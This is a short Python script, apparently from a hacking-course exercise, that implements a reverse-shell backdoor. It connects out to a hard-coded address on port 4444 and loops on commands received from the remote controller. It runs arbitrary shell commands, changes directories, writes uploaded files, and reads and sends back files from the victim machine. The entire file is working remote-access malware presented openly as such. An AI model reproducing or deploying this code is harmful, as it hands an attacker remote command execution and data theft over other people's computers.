#!/usr/bin/env python
import json, subprocess, base64, os, socket

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	def changeDir(self, path):
		os.chdir(str(path))
	def writeFile(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] File Uploaded"
	def readFile(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
	def send(self, data):
		jsonData = json.dumps(data)
		self.connection.send(jsonData)
	def recieve(self):
		jsonData = ""
		while True:
			try:
				jsonData = jsonData + str(self.connection.recv(1024))
				return json.loads(jsonData)
			except Exception:
				continue
	def executeCommands(self, command):
		return subprocess.check_output(command, shell=True)
	def run(self):
		while True:
			try:
				command = self.recieve()
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					commandRes = self.changeDir(command[1])
				elif command[0] == "upload":
					commandRes = self.writeFile(command[1], command[2])
				elif command[0] == "download":
					commandRes = self.readFile(command[1])
				else:
					commandRes = self.executeCommands(command)
			except Exception:
				commandRes = "[-] error occurred"
			self.send(commandRes)

runBackdoor =Backdoor("10.0.2.15", 4444)
runBackdoor.run()
